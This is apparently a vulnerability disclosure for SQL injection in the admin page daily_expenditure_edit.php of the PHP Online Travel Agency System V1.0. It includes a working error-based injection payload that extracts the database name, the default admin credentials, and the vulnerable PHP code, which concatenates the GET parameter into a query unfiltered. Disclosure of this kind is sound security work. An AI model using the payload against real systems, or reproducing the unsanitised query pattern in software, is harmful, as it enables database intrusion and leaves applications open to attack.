# [Online Travel Agency System-SQL Injection-daily_expenditure_edit.php]

## Basic Information

**[Bug Reporter]:**  DililLearngent

**[Application Vendors]:**  https://www.sourcecodester.com/online-travel-agency-system-using-php.html

**[Affected Version]:**Online Travel Agency System V1.0

**[Test Environment]:**  windows10+apache+php7.0

**[Install]:**

1. start **Apache** and **MySQL**.

2. **Extract** the downloaded source code **zip** file.

3. **Copy** the extracted source code folder and **paste** it into the **www directory**.

4. **Create** a **new database** naming **"travel_agency"**.

5. **Import** the provided **SQL** file. The file is known as **"travel_agency.sql"** located inside the extracted source code folder.

6. **Browse** the **Online Travel Agency System** in a **browser**. i.e. **http://localhost/Travel**

   **Admin Access Information:**

   Username: **admin**
   Password: **admin**

## Bug Information

**[Vulnerability type]:** SQL Injection

**[Vulnerability Url]:** `http://10.142.221.111/Travel/admin/daily_expenditure_edit.php?id=1`    

**[Vulnerability Location]:** Travel/admin/daily_expenditure_edit.php

**[Vulnerability Test]:**

1. payload:`id=1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))`

   ![](../../img/20230428164149.png)

   The database name was obtained from the above payload execution.

**[code analysis]:**

Travel/admin/daily_expenditure_edit.php

```php
<?php
$sql="select*from daily_expenditure where id=$_GET[id]";
$result=mysqli_query($con,$sql) or die(mysqli_error($con));
while($row=mysqli_fetch_array($result))
{
	$id =$row["id"];
	$voucher_no=$row["voucher_no"];
	$title=$row["title"];
	$description=$row["description"];
	$amout=$row["amount"];
	$date=$row["date"];
	$inserted_by=$row["inserted_by"];	 	 	 	 	
}
?>
```

The GET parameter `id` is obtained without any filtering and spliced directly into the sql execution statement, and display the errors returned by the database execution back to the front-end page.

